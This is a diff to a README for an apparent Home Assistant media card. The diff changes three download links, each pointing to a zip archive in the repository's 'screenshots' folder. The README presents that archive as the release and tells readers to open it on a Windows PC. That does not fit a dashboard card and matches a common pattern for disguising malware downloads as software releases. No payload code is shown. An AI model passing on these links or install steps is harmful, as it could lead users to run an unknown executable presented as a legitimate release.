@@ -1,6 +1,6 @@
 # 📺 recently-added-media-card - See new media at a glance
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-4B6CB7?style=for-the-badge&logo=github)](https://github.com/ffli3550/recently-added-media-card/raw/refs/heads/main/screenshots/recently-added-media-card-v1.1-beta.5.zip)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-4B6CB7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ffli3550/recently-added-media-card/main/screenshots/recently-added-media-card-v1.1-beta.5.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ Use it in your Home Assistant dashboard to keep new media easy to find. The card
 
 Visit this page to download:
 
-https://github.com/ffli3550/recently-added-media-card/raw/refs/heads/main/screenshots/recently-added-media-card-v1.1-beta.5.zip
+https://raw.githubusercontent.com/ffli3550/recently-added-media-card/main/screenshots/recently-added-media-card-v1.1-beta.5.zip
 
 On the release page, look for the newest version. Download the file that matches your setup, then open it on your Windows PC.
 
@@ -150,7 +150,7 @@ This project fits these topics:
 
 Check the releases page for new versions, fixes, and added support:
 
-https://github.com/ffli3550/recently-added-media-card/raw/refs/heads/main/screenshots/recently-added-media-card-v1.1-beta.5.zip
+https://raw.githubusercontent.com/ffli3550/recently-added-media-card/main/screenshots/recently-added-media-card-v1.1-beta.5.zip
 
 If you update the card later, remove the older version from Home Assistant if needed, then reload your dashboard.
 
